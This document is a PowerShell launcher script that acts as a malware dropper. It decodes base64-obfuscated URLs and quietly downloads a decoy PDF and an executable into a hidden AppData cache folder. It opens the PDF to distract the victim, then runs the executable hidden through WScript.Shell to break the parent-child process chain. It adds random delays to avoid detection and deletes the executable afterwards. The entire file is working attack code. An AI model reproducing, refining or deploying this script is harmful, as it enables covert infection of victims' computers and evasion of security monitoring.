# launcher.ps1 - Fixed for execution policy + scheduled task errors
$ErrorActionPreference = 'SilentlyContinue'

# Random initial delay
Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)

# Use a less monitored folder
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

# Download PDF
$headers = @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing

# Random delay between downloads
Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)

# Download EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing

# Open PDF decoy
Start-Process $pdfPath

# Long delay before launching EXE
Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)

# Method 1: Launch via WScript.Shell (breaks parent-child chain, no scheduled task)
$wsh = New-Object -ComObject WScript.Shell
$wsh.Run("`"$exePath`"", 0, $false)

# Optional: Clean up EXE after 2 minutes
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 120
    Remove-Item -Path $args[0] -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath | Out-Null
